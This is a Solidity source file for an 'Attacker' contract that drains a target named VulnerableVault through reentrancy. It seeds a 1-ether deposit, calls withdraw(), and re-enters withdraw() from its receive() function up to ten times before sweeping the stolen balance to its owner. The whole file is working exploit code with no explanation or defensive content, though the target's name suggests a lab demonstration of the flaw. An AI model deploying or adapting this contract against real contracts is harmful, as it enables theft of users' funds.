// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Drains VulnerableVault by re-entering withdraw() from receive().
contract Attacker {
    IVulnerableVault public immutable vault;
    address public owner;
    uint256 public constant STAKE = 1 ether;
    uint8 private hops;
    uint8 private constant MAX_HOPS = 10; // stop once vault is dry

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value == STAKE, "send exactly 1 ether as seed");
        vault.deposit{value: STAKE}();
        vault.withdraw(); // triggers receive() below, which re-enters
    }

    receive() external payable {
        hops++;
        if (address(vault).balance >= STAKE && hops < MAX_HOPS) {
            vault.withdraw(); // re-enter before our balance is zeroed
        }
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
